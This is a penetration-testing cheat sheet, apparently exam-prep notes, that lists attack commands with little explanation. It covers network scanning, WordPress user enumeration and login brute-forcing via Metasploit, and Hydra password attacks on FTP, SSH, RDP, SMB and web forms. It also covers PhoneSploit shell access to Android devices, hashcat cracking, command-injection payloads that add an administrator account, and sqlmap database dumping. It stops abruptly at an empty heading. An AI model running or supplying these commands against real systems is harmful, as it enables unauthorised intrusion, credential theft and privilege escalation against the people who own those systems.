### 1. Find the IP target.
 ```
  $ ip addr
  $ netdiscover  (If not found $ apt-get install netdiscover)
  $ netdiscover -i eth0   (confirm from ifconfig which net/wifi using)
  $ netdiscover -r IP/24  
 ```
### 2. Nmap scan all
  ```
  $ nmap IP -sV -sC -p -O -oN output.txt
  
  -iL=import IPs,  --top-ports 1000
  ```
### 3. IPs Service, RDP(3389), SQL(3306), FTP(21) check
 ```
  $ nmap -Pn -p 3389 IP | grep open
  $ nmap -Pn -p 3306 IP | grep open
  $ nmap -Pn -p 21 IP | grep open
  ```
### 4. Windows Comman Line
  $ Net user

### 5. Wordlist location find
 ```
  $ locate wordlists
  $ locae rockyou.txt
```
### 6. WP scan (Wp Vulnerability)
```
  $ wpscan --url IP --enumerate u
  
  --enumerate p, -U username, -P password, --usernames userlist.txt, --passwords passwdlist.txt
 
 => msfconsole 
use axiliary/scanner/http/wordpress_login_enum
PASS_FILE /root/Desktop/wordlists/Pass.txt
set RHOSTs IP
set RPORT PORT
set TARGETURI http://IP:port
set USERNAME admin
->run
```
### 7. Hydra
``` 
 Use for FTP:
     $ hydra -l user -P passlist.txt ftp://IP
 Use for SSH:
     $ hydra -l <username> -P passwdlist.txt IP -t 4 ssh
 Use for Web Post:
     $ hydra -l <username> -P <wordlist> 10.10.46.122 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

- hydra -L usernames.txt -P pass.txt <IP> mysql
- hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V`
- hydra -V -f -L <userslist> -P <passwlist> ***rdp***://<IP>`
- hydra -P common-snmp-community-strings.txt target.com snmp
- hydra -l Administrator -P words.txt 192.168.1.12 smb t 1
```
### 8. Prints the route that a packet takes to reach the host
  $ traceroute google.com

### 9. Android
```
  $ netdiscover -r IP/24   (got final IP)
  $ nmap -O IP
  
  apt install adb
  pip install colorama
  git clone https://github.com/aerosol-can/PhoneSploit   (if not work use https://github.com/aerosol-can/PhoneSploit)
  cd PhoneSploit
  python3 phonesploit.py
  select 3 to connect new phone
  Add IP address of android device
  4 (Access shell on phone)
  IP address again of android device
  pwd > ls > cd sdcard > ls > cd downloads > cat file.txt
```
### 10. Stegnography
  ```
  $ Snow.exe -C -p “given_password” file_name.txt  (Pass tu hobo = 'test')
  -C  compressing / uncompressing
  -p  password

  Open Stego (GUI tool):
     Open the exe > open and select file > click get
 ```
### 11. Cryptography
```
#### Identify:
https://hashes.com/en/tools/hash_identifier
https://www.onlinehashcrack.com/hash-identification.php
https://www.tunnelsup.com/hash-analyzer
#### Crak hash:
https://hashes.com/en/decrypt/hash
https://crackstation.net

  $ hash-identifier  ->Enter and paste the hash.
  $ haiti -e <crypto_hash>    (https://noraj.github.io/haiti/#/pages/usage)
  $ Hashcat -a 3 -m 900 hash.txt /rockyou.txt
  -a attack mode (3)
  -m hashtype (select number fom below)
   900 = md4
   1800 = SHA512CRYPT
   110  = SHA1 with SALT HASH
   0  = MD5
   100 = SHA1
   1400 = SHA256
  ``` 
## 12. Used Tools
```
Veracrypt = Encryt / Decrypt the Hidden Disk 
Cryptool
Snow
Bctextencoder
Md5 & sha1 checksum utility
Wpscan
Nmap
Metasploit
Hydra
Wireshark
Winscp
OWASP ZAP  
RDP
```
### 13. Command Injection
```
Severity: Low        Severity: Medium           Severity: High          
1; ls                1& ls                      || ls
1; id                1& net user                || net user
1; net user
| ls

 Others low Severity cmd: 
| hostname
| whoami
| dir C:\path.txt
| type path.txt
| net user
| net user Test /Add
| net user
| net user Test
| net localgroup Administrators Test /Add
Successfully created the "Test" user account.
```
### 14 SQL Injection with SQLmap:
  ```
  $ sqlmap -u http://site.com?id=1 --cookie="cookies" --risk 3 --level 5 --dbms=mysql --dbs
  $ sqlmap -u "http://site.com/sqli/?id=1&Submit=Submit" --cookie="cookies1;cookies2" --data="data" --risk 3 -level 5 --dbms=mysql --dbs
  $ sqlmap -u "http://site.com/sqli/cookies.php" --cookie="cookies1;cookies2" --data="data" -p id --risk 3 -level 5 --dbms=mysql --dbs
  $ sqlmap -r test.txt --batch --risk 3 --level 4 --dbs
  $ sqlmap -r test.txt --batch --risk 3 --level 4 -D databasename --tables
  $ sqlmap -r test.txt --batch --risk 3 --level 4 -D databasename -T tables name --dump
```
### 15. 
